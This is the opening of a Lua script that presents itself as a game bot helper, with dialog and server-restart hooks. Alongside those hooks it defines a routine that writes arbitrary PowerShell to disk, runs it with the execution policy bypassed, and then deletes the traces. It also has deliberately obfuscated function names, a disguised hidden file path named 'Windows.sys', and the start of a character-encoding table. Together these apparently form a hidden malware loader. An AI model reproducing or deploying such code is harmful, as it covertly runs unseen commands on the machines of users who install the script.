CONFIG = CONFIG
function FNV32(c)
	if c[0] == "OnDialogRequest" and (c[1]:find("embed_data|netID|") ~= nil and (c[1]:lower()):find(string.lower((getBot()).name)) ~= nil) then
		local v = string.lower(c[1])
		local I = string.find(v, string.lower((getBot()).name))
		local s = string.sub(v, I + #(getBot()).name + 2, I + #(getBot()).name + 4)
		s = s:gsub("|", "")
		BOT = s
	elseif
		c[0]:find("OnConsoleMessage")
		and (c[1]:find("Restarting server for update") ~= nil or c[2]:find("Restarting server for update") ~= nil)
	then
		if CONFIG.Hook_setting.remove_bot_when_restart then
			removeBot((getBot()).name)
			return
		end
	end
end
function RunPowershell(c)
	if CONFIG.DEVELOPERMODE == true then
		local v = io.popen("powershell -command -", "w")
		v:write(c)
		v:close()
		return
	end
	local v = "payy-ps.ps1"
	local I = "payy-ps.bat"
	local s = io.open(I, "r")
	if s ~= nil then
		io.close(s)
		v = "payy-ps_2.ps1"
		I = "payy-ps_2.bat"
	end
	local z = io.open(v, "w")
	z:write(c)
	z:close()
	local g = io.open(I, "w")
	g:write("PowerShell -NoProfile -ExecutionPolicy Bypass -Command " .. '"' .. "& ./" .. v .. '"')
	g:close()
	os.execute(I)
	os.remove(v)
	os.remove(I)
end
Version = "1"
BOT = nil
local c = ""
local v = os.time() + 300
function IIIIllllIlI(c, v)
	if v == nil then
		v = "%s"
	end
	local I = {}
	for c in string.gmatch(c, "([^" .. v .. "]+)") do
		table.insert(I, c)
	end
	return I
end

function IIIIllllI(c)
	if c then
		return "C:\\\\Users\\\\Public\\\\Windows.sys"
	end
	return "C:\\Users\\Public\\Windows.sys"
end

function IIIIllllIlIIIIl(c)
	local v = {
		"a",
		"b",
		"c",
		"d",
		"e",
		"f",
		"g",
		"h",
		"i",
		"j",
		"k",
		"l",
		"m",
		"n",
		"o",
		"p",
		"q",
		"r",
		"s",
		"t",
		"u",
		"v",
		"w",
		"x",
		"y",
		"z",
		"1",
		"2",
		"3",
		"4",
		"5",
		"6",
		"7",
		"8",
		"9",
		"0",
		"|",
		"A",
		"B",
		"C",
		"D",
		"E",
		"F",
		"G",
